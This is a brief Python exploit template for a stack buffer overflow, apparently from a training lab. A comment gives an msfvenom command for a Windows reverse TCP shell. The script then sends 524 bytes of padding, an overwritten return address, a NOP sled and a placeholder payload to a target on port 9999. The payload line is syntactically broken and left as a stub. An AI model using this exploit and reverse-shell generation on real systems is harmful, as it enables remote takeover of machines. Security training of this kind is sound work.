// msfvenom -p windows/shell_reverse_tcp LHOST=vpnip LPORT=1234 EXITFUNC=thread -f c -a x86 -b "\x00\x80"
#!/usr/bin/python3  
import sys, socket
  
payload = (  
b"\PAYLOADHERE  
)  
  
shellcode = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32 + payload

try:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('vulnerableboxip', 9999))
 s.send((shellcode))
 s.close()
except:
 print("Error connecting to server")
 sys.exit() 
